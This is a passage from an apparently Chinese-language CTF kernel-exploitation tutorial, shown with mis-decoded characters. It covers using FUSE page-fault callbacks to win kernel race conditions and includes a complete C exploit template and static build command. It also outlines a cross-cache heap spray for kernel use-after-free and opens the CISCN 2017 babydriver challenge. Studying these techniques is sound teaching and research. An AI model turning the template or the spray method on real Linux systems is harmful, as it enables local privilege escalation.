alt="image.png"></a></p><p>å½“ç„¶ï¼Œç”±äºæˆ‘ä»¬çš„ä¾‹ç¨‹æ²¡æœ‰å®ç° <code>open()</code>ã€<code>read()</code>ã€<code>write()</code> ç­‰å‡½æ•°ï¼Œè¿™é‡Œç›´æ¥å¯¹æ–‡ä»¶è¿›è¡Œè®¿é—®ä¼šæç¤ºé”™è¯¯ï¼š</p><p><a href="https://s2.loli.net/2023/01/10/gZF7Dtz6YOEvCUy.png"><img src="https://s2.loli.net/2023/02/06/CzInBR1b4aJgUSE.png" alt="image.png"></a></p><p>FUSE æ›´æ·±å…¥çš„ç”¨æ³•æˆ‘ä»¬å°±æš‚ä¸”ä¸æ·±å…¥å­¦ä¹ äº†ï¼Œæˆ‘ä»¬è¿™é‡Œä¸»è¦å…³æ³¨å¦‚ä½•åœ¨æ¡ä»¶ç«äº‰ä¸­åˆ©ç”¨ FUSE</p><h3 id="åˆ©ç”¨-FUSE-æ›¿ä»£-userfaultfd-è¿›è¡Œæ¡ä»¶ç«äº‰åˆ©ç”¨"><a href="#åˆ©ç”¨-FUSE-æ›¿ä»£-userfaultfd-è¿›è¡Œæ¡ä»¶ç«äº‰åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨ FUSE æ›¿ä»£ userfaultfd è¿›è¡Œæ¡ä»¶ç«äº‰åˆ©ç”¨"></a>åˆ©ç”¨ FUSE æ›¿ä»£ userfaultfd è¿›è¡Œæ¡ä»¶ç«äº‰åˆ©ç”¨</h3><p>è®©æˆ‘ä»¬é‡æ–°å®¡è§†å‰é¢æˆ‘ä»¬åˆ©ç”¨ userfaultfd åœ¨æ¡ä»¶ç«äº‰ä¸­åˆ©ç”¨çš„æµç¨‹çš„æœ¬è´¨ï¼š</p><ul><li>è®©è¿›ç¨‹åœ¨å†…æ ¸ä¸­è¿›è¡Œæ•°æ®æ‹·è´æ—¶æš‚åœï¼Œæ§åˆ¶æƒè½¬äº¤æˆ‘ä»¬çš„è‡ªå®šä¹‰å‡½æ•°ï¼Œæˆ‘ä»¬åœ¨è‡ªå®šä¹‰å‡½æ•°ä¸­å°†è¯¥å†…æ ¸å¯¹è±¡é‡æ–°åˆ†é…åˆ°åˆ«å¤„ï¼Œåœ¨æ¢å¤æ•°æ®æ‹·è´æ—¶ä¾¿èƒ½è¯»å†™å…¶ä»–å†…æ ¸ç»“æ„ä½“çš„æ•°æ®</li></ul><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>åˆ©ç”¨ FUSE æˆ‘ä»¬åŒæ ·å¯ä»¥å®ç°ç±»ä¼¼çš„æ•ˆæœ</strong>ï¼š</p><ul><li>æ³¨å†Œä¸€ä¸ªç”¨æˆ·ç©ºé—´æ–‡ä»¶ç³»ç»Ÿï¼Œä¸ºè¯»å†™ç­‰æ¥å£æ³¨å†Œå›è°ƒå‡½æ•°ï¼Œä½¿ç”¨ mmap å°†è¯¥æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¸€ä¸ªæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­</li><li>å½“è¿›ç¨‹åœ¨å†…æ ¸ä¸­è¯»å†™è¿™å— mmap å†…å­˜æ—¶ï¼Œ<strong>ä¾¿ä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œæ­¤æ—¶æ§åˆ¶æƒä¾¿ä¼šè½¬äº¤åˆ°æˆ‘ä»¬æ³¨å†Œçš„å›è°ƒå‡½æ•°å½“ä¸­</strong></li><li><strong>åœ¨å›è°ƒå‡½æ•°å½“ä¸­å®Œæˆæˆ‘ä»¬çš„æ¶æ„æ“ä½œ</strong>ï¼ˆä¾‹å¦‚å°†è¿›ç¨‹æ­£åœ¨è¯»å†™çš„å†…æ ¸å¯¹è±¡é‡æ–°åˆ†é…åˆ°åˆ«çš„ä½ç½®ï¼Œæˆ–æ˜¯è¦†å†™è¯¥å¯¹è±¡ä»¥æ”¹å˜ä¸€äº›ç‰¹å®šå±æ€§ï¼‰</li><li>é‡æ–°å›åˆ°å†…æ ¸ä¸­çš„è¯»å†™æµç¨‹ï¼Œæ­¤æ—¶è¿›ç¨‹ä¾¿ä¼šæŒ‰ç…§æˆ‘ä»¬æ”¹å˜åçš„å†…æ ¸å¯¹è±¡<strong>è¿›è¡Œæ¶æ„æ“ä½œ</strong>ï¼ˆä¾‹å¦‚æˆ‘ä»¬åœ¨ FUSE çš„å›è°ƒå‡½æ•°ä¸­å°†è¯¥å¯¹è±¡é‡æ–°åˆ†é…åˆ°æŸä¸ªå‡½æ•°æŒ‡é’ˆï¼Œæ¢å¤åˆ°å†…æ ¸çš„è¯»å†™è¿‡ç¨‹æ—¶è¿›ç¨‹ä¾¿ä¼šè¦†å†™æ‰è¯¥å‡½æ•°æŒ‡é’ˆï¼‰</li></ul><p>åˆ©ç”¨ FUSEï¼Œæˆ‘ä»¬å¯ä»¥åƒ userfaultfd é‚£æ ·<strong>åˆ©ç”¨æ¡ä»¶ç«äº‰æ¼æ´å®Œæˆåˆ©ç”¨</strong>ï¼Œä¸å¹¸çš„æ˜¯å¸¸è§„çš„ libfuse åº“å¹¶ä¸æ”¯æŒé™æ€ç¼–è¯‘ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬æ— æ³•åƒä»¥å¾€ä¸€æ ·å…ˆé™æ€ç¼–è¯‘ä¸€ä¸ª exp å†ä¼ åˆ°è¿œç¨‹ï¼Œ<strong>ä½†ä¸‡å¹¸çš„æ˜¯ libfuse åº“æ˜¯å¼€æºçš„</strong>ï¼Œå®‰å…¨ç ”ç©¶å‘˜ BitsByWill å’Œ D3v17 å°†å…¶è¿›è¡Œäº†ä¸€äº›è£å‰ªï¼ˆè£å‰ªæ‰äº† dlopen ç­‰ï¼Œä½†è¿˜æ˜¯å¾ˆå¤§â€¦ï¼‰ï¼Œåšäº†ä¸€ä¸ªå¯ä»¥ä¾›é™æ€ç¼–è¯‘çš„ <a href="https://github.com/Crusaders-of-Rust/CVE-2022-0185/blob/master/libfuse3.a">libfuse3.a</a> åŠç›¸å…³çš„å¤´æ–‡ä»¶ç­‰ï¼ˆå‚è§<a href="https://github.com/Crusaders-of-Rust/CVE-2022-0185">è¿™é‡Œ</a>ï¼‰</p><p>ä»¥ä¸‹æ˜¯ç¬”è€…ç¼–å†™çš„ FUSE åˆ©ç”¨çš„æ¨¡æ¿ï¼Œå’Œç¤ºä¾‹ç¨‹åºç›¸æ¯”ï¼Œæˆ‘ä»¬éœ€è¦å¯¹ä¸€äº›æ¥å£è¿›è¡Œå¾®è°ƒï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FUSE_USE_VERSION 34</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fuse.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> EVIL_FILE_NAME <span class="hljs-meta-string">&quot;a3fuse_evil_file&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> EVIL_DAEMON_NAME <span class="hljs-meta-string">&quot;evil_fuse&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> EVIL_MOUNT_PATH <span class="hljs-meta-string">&quot;./evil&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> EVIL_FILE_PATH EVIL_MOUNT_PATH <span class="hljs-meta-string">&quot;/&quot;</span> EVIL_FILE_NAME</span><br><br><span class="hljs-keyword">char</span> *evil_args[] = &#123;EVIL_DAEMON_NAME, EVIL_MOUNT_PATH, <span class="hljs-literal">NULL</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* path, <span class="hljs-keyword">void</span>* buf, </span></span><br><span class="hljs-params"><span class="hljs-function">                               <span class="hljs-keyword">fuse_fill_dir_t</span> filler, <span class="hljs-keyword">off_t</span> offset, </span></span><br><span class="hljs-params"><span class="hljs-function">                               struct fuse_file_info* fi, </span></span><br><span class="hljs-params"><span class="hljs-function">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* path, struct stat *stbuf, </span></span><br><span class="hljs-params"><span class="hljs-function">                               struct fuse_file_info *fi)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> size, </span></span><br><span class="hljs-params"><span class="hljs-function">                            <span class="hljs-keyword">off_t</span> offset, struct fuse_file_info *fi)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> size, </span></span><br><span class="hljs-params"><span class="hljs-function">                             <span class="hljs-keyword">off_t</span> offset, struct fuse_file_info *fi)</span></span>;<br><br><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fuse_operations</span> <span class="hljs-title">a3fuse_evil_ops</span> =</span> &#123;<br>    .readdir = a3fuse_evil_readdir,<br>    .getattr = a3fuse_evil_getattr,<br>    .read = a3fuse_evil_read,<br>    .write = a3fuse_evil_write,<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">err_exit</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* path, <span class="hljs-keyword">void</span>* buf, </span></span><br><span class="hljs-params"><span class="hljs-function">                               <span class="hljs-keyword">fuse_fill_dir_t</span> filler, <span class="hljs-keyword">off_t</span> offset, </span></span><br><span class="hljs-params"><span class="hljs-function">                               struct fuse_file_info* fi, </span></span><br><span class="hljs-params"><span class="hljs-function">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br><br>    filler(buf, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, EVIL_FILE_PATH, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* path, struct stat *stbuf, </span></span><br><span class="hljs-params"><span class="hljs-function">                               struct fuse_file_info *fi)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0755</span> | S_IFDIR;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">2</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(path + <span class="hljs-number">1</span>, EVIL_FILE_PATH)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0644</span> | S_IFREG;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">1</span>;<br>        stbuf-&gt;st_size = <span class="hljs-number">0x1000</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> size, </span></span><br><span class="hljs-params"><span class="hljs-function">                            <span class="hljs-keyword">off_t</span> offset, struct fuse_file_info *fi)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-keyword">char</span> evil_buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fill your buffer with needed data there</span><br><span class="hljs-comment">     * this&#x27;s an example, filling it simply with &#x27;A&#x27;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">memset</span>(evil_buf, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-built_in">memcpy</span>(buf, evil_buf + offset, size);<br><br>    <span class="hljs-comment">/* now you can do anything useful for exploit there */</span><br>    <span class="hljs-comment">/* Your code here: */</span><br><br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> size, </span></span><br><span class="hljs-params"><span class="hljs-function">                             <span class="hljs-keyword">off_t</span> offset, struct fuse_file_info *fi)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-keyword">char</span> evil_buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(evil_buf + offset, buf, size);<br><br>    <span class="hljs-comment">/* now you can do anything useful for exploit there */</span><br>    <span class="hljs-comment">/* Your code here: */</span><br><br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fuse_exploit_sample</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">void</span> *nearby_page, *evil_page;<br>    <span class="hljs-keyword">int</span> evil_file_fd;<br><br>    <span class="hljs-keyword">if</span> ((evil_file_fd = open(EVIL_FILE_PATH, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open evil file in FUSE!&quot;</span>);<br>    &#125;<br><br>    nearby_page = mmap((<span class="hljs-keyword">void</span>*)<span class="hljs-number">0x1337000</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, <br>                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    evil_page = mmap((<span class="hljs-keyword">void</span>*)<span class="hljs-number">0x1338000</span>, <span class="hljs-number">0x1000</span>,  PROT_READ | PROT_WRITE, <br>                     MAP_SHARED | MAP_FIXED, evil_file_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (evil_page != (<span class="hljs-keyword">void</span>*)<span class="hljs-number">0x1338000</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to map for FUSE file!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/** </span><br><span class="hljs-comment">     * now try reading or writing through nearby_page and evil_page in kernel, </span><br><span class="hljs-comment">     * the a3fuse_evil_read/a3fuse_evil_write will be triggered automatically</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">/* Your code here: */</span><br><br>    munmap(nearby_page, <span class="hljs-number">0x1000</span>);<br>    munmap(evil_page, <span class="hljs-number">0x1000</span>);<br>    close(evil_file_fd);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* register for FUSE */</span><br>    fuse_main(<span class="hljs-keyword">sizeof</span>(evil_args) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>*) - <span class="hljs-number">1</span>, evil_args, <br>              &amp;a3fuse_evil_ops, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">/* Your exploit here: */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>åŒæ—¶éœ€è¦åœ¨ç¼–è¯‘é€‰é¡¹ä¸­æ·»åŠ  <code>-I ./libfuse</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL"><span class="hljs-meta">$</span><span class="bash"> gcc -no-pie -static exp.c -I ./libfuse libfuse3.a -o exp -masm=intel -pthread -D_FILE_OFFSET_BITS=64</span><br></code></pre></div></td></tr></table></figure><h3 id="FUSE-in-CTF"><a href="#FUSE-in-CTF" class="headerlink" title="FUSE in CTF"></a><em>FUSE in CTF</em></h3><p>è™½ç„¶æˆ‘ä»¬æœ‰äº†å¯ä»¥é™æ€ç¼–è¯‘çš„ libfuse åº“ï¼Œä½†åœ¨ CTF çš„ kernel pwn è¿™æ ·â€æ®‹ç¼ºâ€œçš„ç¯å¢ƒå½“ä¸­æˆ‘ä»¬é€šå¸¸æ˜¯æ— æ³•ä½¿ç”¨ FUSE çš„ï¼Œå› è€Œå°±æ— æ³•ä½¿ç”¨è¿™ç§åˆ©ç”¨æ‰‹æ³•ï¼š(</p><p><a href="https://s2.loli.net/2023/01/11/lMx5TnkEivWryFX.png"><img src="https://s2.loli.net/2023/02/06/LFGCMByWh4c72dl.png" alt="image.png"></a></p><p><a href="https://s2.loli.net/2023/01/15/e12LwEHGJmXjpx5.png"><img src="https://s2.loli.net/2023/02/06/RdLs89OItX4k6TZ.png" alt="image.png"></a></p><p><a href="https://s2.loli.net/2023/01/15/LcHPW1EVi7A6rwK.png"><img src="https://s2.loli.net/2023/02/06/XoT4p3imxIuE6tf.png" alt="image.png"></a></p><blockquote><p>ä¸è¿‡å¯ä»¥åœ¨å®Œå¤‡çš„çœŸå®ç¯å¢ƒä¸­ä½¿ç”¨è¿™ç§åˆ©ç”¨æ‰‹æ³• : ï¼‰</p></blockquote><h1 id="Kernel-Heap-Use-After-Free"><a href="#Kernel-Heap-Use-After-Free" class="headerlink" title="Kernel Heap - Use After Free"></a>Kernel Heap - Use After Free</h1><p>UAF å³ Use After Freeï¼Œé€šå¸¸æŒ‡çš„æ˜¯<strong>å¯¹äºé‡Šæ”¾åæœªé‡ç½®çš„å‚æ‚¬æŒ‡é’ˆçš„åˆ©ç”¨</strong>ï¼Œæ­¤å‰åœ¨ç”¨æˆ·æ€ä¸‹çš„ heap é˜¶æ®µå¯¹äº ptmalloc çš„åˆ©ç”¨å¾ˆå¤šéƒ½æ˜¯åŸºäºUAFæ¼æ´è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ©ç”¨</p><p>åœ¨ CTF å½“ä¸­ï¼Œå†…æ ¸çš„â€œå †å†…å­˜â€ä¸»è¦æŒ‡çš„æ˜¯çº¿æ€§æ˜ å°„åŒºï¼ˆdirect mapping areaï¼‰ï¼Œå¸¸ç”¨çš„åˆ†é…å‡½æ•° kmalloc ä»æ­¤å¤„åˆ†é…å†…å­˜ï¼Œå¸¸ç”¨çš„åˆ†é…å™¨ä¸º slubï¼Œè‹¥æ˜¯åœ¨ kernel ä¸­å­˜åœ¨ç€å‚æ‚¬æŒ‡é’ˆï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥ä»¥æ­¤å®Œæˆå¯¹ slab/slub å†…å­˜åˆ†é…å™¨çš„åˆ©ç”¨ï¼Œé€šè¿‡ Kernel UAF å®Œæˆææƒ</p><p>slub åˆ†é…å™¨çš„ç»“æ„ç¬”è€…åœ¨ <a href="#slab" style="font-weight:bold">æœ¬é¡µè¿™é‡Œ</a> ä¸­å·²ç»è¿›è¡Œç®€è¦å™è¿°ï¼Œè‹¥æ˜¯ä¸è®°å¾—äº†å¯ä»¥å›å»çœ‹çœ‹ï¼ˆç¬‘ï¼‰</p><p><span id="fuck"> </span>åœ¨ä¿æŠ¤æœºåˆ¶ä¸­å¼•ç”¨çš„æ–‡ç« é‡Œçœ‹åˆ°å¦‚æœå¼€å¯äº†SLAB_ACCOUNTä¹Ÿèƒ½ç…§æ ·åˆ©ç”¨, å‰ææ˜¯æœ‰ç€ä¸€ä¸ªgeneral cacheä¸­çš„UAF: </p><ol><li>Spray cache <em>A</em> (which should be trivial given it is a general-purpose cache) filling in all partial slabs.</li><li>Trigger freeing the vulnerable object and then free all sprayed objects at the same time.</li><li>Spray objects from cache <em>B</em>.</li><li>Trigger the UAF.</li></ol><p>åœ¨é‡Šæ”¾sprayåçš„general cache Aå, æ•´ä¸ªslabå¯èƒ½ä¼šè¢«ç§»åŠ¨åˆ°special cache Bä¸­ç»§ç»­ä½¿ç”¨, æ­¤æ—¶ä»ç„¶å¯ä»¥è¾¾æˆä¸€æ ·çš„ç›®çš„. </p><p><strong>But</strong> the technique itself is obviously <strong>less reliable</strong> since it relies on the entire slab being reallocated to another cache, but given there are no memory restrictions, it can achieve a high success rate. </p><h2 id="ä¾‹é¢˜ï¼šCISCN-2017-babydriver"><a href="#ä¾‹é¢˜ï¼šCISCN-2017-babydriver" class="headerlink" title="ä¾‹é¢˜ï¼šCISCN - 2017 - babydriver"></a>ä¾‹é¢˜ï¼šCISCN - 2017 - babydriver</h2><blockquote><p>å¯ä»¥è¯´æ˜¯æœ€æœ€æœ€æœ€æœ€æœ€æœ€ç»å…¸çš„kernel pwnå…¥é—¨é¢˜</p><p><a href="https://arttnba3.cn/download/ciscn2017/pwn/babydriver.tar.gz">ç‚¹å‡»ä¸‹è½½-babydriver.tar.gz</a></p></blockquote><p>è§£å‹ï¼Œæƒ¯ä¾‹çš„<code>ç£ç›˜é•œåƒ + å†…æ ¸é•œåƒ + å¯åŠ¨è„šæœ¬</code>ç»“æ„</p><p>æŸ¥çœ‹<code>boot.sh</code>ï¼š<del>å†™çš„å¥½ä¹±å•Š</del>ï¼ˆ<del>æ¼</del>ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>qemu-system-x86_64 -initrd core.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;  -monitor /dev/null -m 128M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep 